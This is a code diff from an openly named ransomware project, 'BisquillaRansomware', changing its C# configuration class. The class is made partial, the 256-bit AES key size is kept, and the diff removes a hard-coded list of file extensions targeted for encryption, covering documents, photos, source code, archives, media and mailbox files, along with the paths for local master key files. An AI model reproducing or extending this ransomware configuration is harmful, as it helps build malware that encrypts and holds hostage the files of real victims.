@@ -10,9 +10,10 @@ using System.Security.Cryptography;
 namespace BisquillaRansomware
 {
     /// <summary>
-    /// Contains Main Configuration
+    /// Contains Main Configuration.
+    /// This is a Partial Class. Other Values and Some elements you will find in ConfigurationManagerPartialGenerated.tf generator
     /// </summary>
-    public sealed class ConfigurationManager
+    public partial class ConfigurationManager
     {
         private ConfigurationManager() { }
 
@@ -30,29 +31,6 @@ namespace BisquillaRansomware
         /// AES Key Size - CAN BE CHANGED
         /// </summary>
         public const int CHIPER_KEY_SIZE = 256;
-
-        /// <summary>
-        /// Target File Extension Allowed for Encription - CAN BE CHANGED
-        /// </summary>
-        public static readonly string[] TARGET_FILES = new string[]
-        {
-            ".JPG", ".GIF", ".PDF", ".PNG", ".NEF",
-            ".ZIP", ".RAR", ".TAR", ".GZ",
-            ".CS", ".VB", ".JAVA", ".CLASS", ".JS", ".VBS", ".CSC", ".JSON", ".TXT", ".C", ".CPP", ".H", ".CONFIG", ".PY", ".R", ".XAML", ".JSP", ".PHP",
-            ".DOC", ".DOCX", ".XLS", ".XLSX", ".PPT", ".PPTX",
-            ".MP3", ".MP4", ".AVI", ".MPEG",
-            ".PST", ".MSG", ".EML", ".DBX", ".MBX", ".WAB", ".JAR"
-        };
-
-        /// <summary>
-        /// Local Copy of Master Public Key - CAN BE CHANGED
-        /// </summary>
-        public static readonly string LOCAL_PUB_KEY_NAME = System.IO.Path.Combine(System.Windows.Forms.Application.LocalUserAppDataPath, "master_public_key.info");
-
-        /// <summary>
-        /// Local Copy of Master Private Key - CAN BE CHANGED 
-        /// </summary>
-        public static readonly string LOCAL_PRI_KEY_NAME = System.IO.Path.Combine(System.Windows.Forms.Application.LocalUserAppDataPath, "master_pri_key.info");
 
         /// <summary>
         /// Target Filter - CAN BE CHANGED
